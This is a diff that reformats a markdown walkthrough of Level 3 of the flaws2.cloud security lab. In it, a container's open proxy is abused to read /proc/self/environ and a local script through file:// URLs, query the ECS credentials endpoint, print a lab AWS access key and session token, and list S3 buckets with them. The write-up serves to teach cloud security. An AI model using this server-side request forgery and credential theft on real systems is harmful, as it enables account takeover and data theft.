@@ -478,21 +478,20 @@ This contains all the commands used to create the layers, including the one we w
 
 ## Level 3
 
-Again we’re dealing with a proxy:
+<blockquote>
+    The container's webserver you got access to includes a simple proxy that can be access with: <br/>
+    <a href="http://container.target.flaws2.cloud/proxy/http://flaws.cloud/">http://container.target.flaws2.cloud/proxy/http://flaws.cloud</a> or <br/> 
+    <a href="http://container.target.flaws2.cloud/proxy/http://neverssl.com">http://container.target.flaws2.cloud/proxy/http://neverssl.com</a>
+</blockquote>
 
-The container's webserver you got access to includes a simple proxy that can be access with: 
-http://container.target.flaws2.cloud/proxy/http://flaws.cloud              or 
-http://container.target.flaws2.cloud/proxy/http://neverssl.com
+Again we’re dealing with a proxy. But this time _we cannot read the metadata anymore_:
+<a href="http://container.target.flaws2.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials">http://container.target.flaws2.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials</a>   
 
+One of the hints tells us that we can also read local files with this proxy. Pretty cool, let's see:
 
-This time we cannot read the metadata anymore:
-http://container.target.flaws2.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials   > no results here
+<a href="http://container.target.flaws2.cloud/proxy/file:///proc/self/environ">http://container.target.flaws2.cloud/proxy/file:///proc/self/environ</a>
 
-One of the hints tells us that we can also read local files with this proxy. Pretty cool:
-
-http://container.target.flaws2.cloud/proxy/file:///proc/self/environ
-
-
+```bash
 HOSTNAME=ip-172-31-56-11.ec2.internal
 HOME=/root
 AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/9c3439c4-b560-4aac-aa62-f904a24a34e6
@@ -502,11 +501,13 @@ ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/c88043c3-94ac-4650-a13f-1c152
 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 AWS_REGION=us-east-1
 PWD=/
+```
 
-Out of curiosity, we could even see the proxy script file. In the previous level one of the commands for one of the layers mentioned this interesting file: /var/www/html/proxy.py
+Out of curiosity, we could even see the proxy script file. In the previous level one of the commands for one of the layers mentioned this interesting file: ```/var/www/html/proxy.py```:
 
-http://container.target.flaws2.cloud/proxy/file:////var/www/html/proxy.py
+<a href="http://container.target.flaws2.cloud/proxy/file:////var/www/html/proxy.py">http://container.target.flaws2.cloud/proxy/file:////var/www/html/proxy.py</a>
 
+```python
 import SocketServer
 import SimpleHTTPServer
 import urllib
@@ -534,14 +535,19 @@ class Proxy(SimpleHTTPServer.SimpleHTTPRequestHandler):
 httpd = SocketServer.ForkingTCPServer(('', PORT), Proxy)
 print "serving at port", PORT
 httpd.serve_forever()
+```
 
 From inside a container, we could query the credentials using with the following command:
 
+```bash
 ~ curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
+```
 
-Let’s use the proxy:
-http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/9c3439c4-b560-4aac-aa62-f904a24a34e6
+Let’s use the proxy to make the request:
 
+<a href="http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/9c3439c4-b560-4aac-aa62-f904a24a34e6">http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/9c3439c4-b560-4aac-aa62-f904a24a34e6</a>
+
+```js
 {
     "RoleArn": "arn:aws:iam::653711331788:role/level3",
     "AccessKeyId": "ASIAZQNB3KHGNJDDVTOZ",
@@ -549,17 +555,20 @@ http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/9
     "Token": "FwoGZXIvYXdzEC8aDNofefCYUAGaQebFECLgAuJuvG3iYlMkMl9PPpsjwIi7p6SSbFs231RiquEJqnDZlusZ9etGxmRxWsj1n2CmnrgVA+GztQZZ63J7Bu3jk+15HoyeJ/mfALIiq4SuUB1rwHzbYr2oQrQ14WyE1zjE7eGJmsP5ADbss8o4AtNUR6fe2JmYLWCsdIZj9OToCOm+Ch58L7EWYiTAshTBCkoQ6WFkf5SehZN1qeqaFr9xT7y6jql4bJ+BK+dUPU/Mkj7VCR6YVdvLGwyaxOLW9e0IyNu4ZxKb8Pig0Y6JtT8HtSpOB/KEf8hBiDAXBRm0k/fBQWbK7sOD9ftL9Fwjbw9FpAHpyu9YPzzpsm8DCuK87Un9cMJTQ7DNqT5xmzQz7/hvox4hmRPpECKf1/rOcIHYzQcUfUEi2BoepAC0/57TT+isFSlNogKJXqdGtR9B+donfdbfd+HwsEnwVNDpK03r26/SoNpsk0+Gsm028hW1V7IokI397QUyngGuPsDYraOKRML0Q4A379l+NP5ZeEcoUv7O5KrOC49xRyhBz2mtBGKJqdjbH7z9CzTL2gNmroJYbl3wuLRg1YPhSOjWl57DlEG9z+a3su00b3DxwdSaOXWaH6wD7i/xFPM2MviCgpuqlXgJxKzlXvVq0o/OqV4IncoBG98yOdS7KN4nNY2fkp7o+rJf9e7dJpGzvb+LIBPAuKY+dnXutw==",
     "Expiration": "2019-11-04T03:28:48Z"
 }
+```
 
-Add these credentials, including the Token, to ~/.aws/credentials then list all the buckets visible to this profile:
+Add these credentials, _including the token_, to ```~/.aws/credentials``` then list all the buckets visible to this profile:
 
+```bash
 ~ aws --profile attacker-level3 --region us-east-1 s3 ls
 2018-11-20 19:50:08 flaws2.cloud
 2018-11-20 18:45:26 level1.flaws2.cloud
 2018-11-21 01:41:16 level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud
 2018-11-26 19:47:22 level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud
 2018-11-27 20:37:27 the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud
+```
 
-The final link is: http://the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud
+The final link is: <a href="http://the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud">http://the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud</a>
 
 ## References
 
